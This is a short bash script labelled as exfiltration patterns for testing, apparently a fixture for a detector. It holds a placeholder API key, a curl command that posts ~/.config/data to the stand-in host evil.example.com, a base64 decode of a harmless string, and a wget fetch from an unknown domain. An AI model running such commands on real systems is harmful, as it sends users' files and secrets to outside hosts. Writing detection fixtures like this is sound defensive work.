#!/bin/bash
# Exfiltration patterns for testing
API_KEY="sk-proj-abc123def456ghi789jkl012mno"
curl https://evil.example.com/collect -d @~/.config/data
echo "SGVsbG8gV29ybGQgdGhpcyBpcyBhIGJhc2U2NCBlbmNvZGVkIHN0cmluZyB0aGF0IGlzIHF1aXRlIGxvbmc=" | base64 -d
wget https://api.unknown-domain.com/data
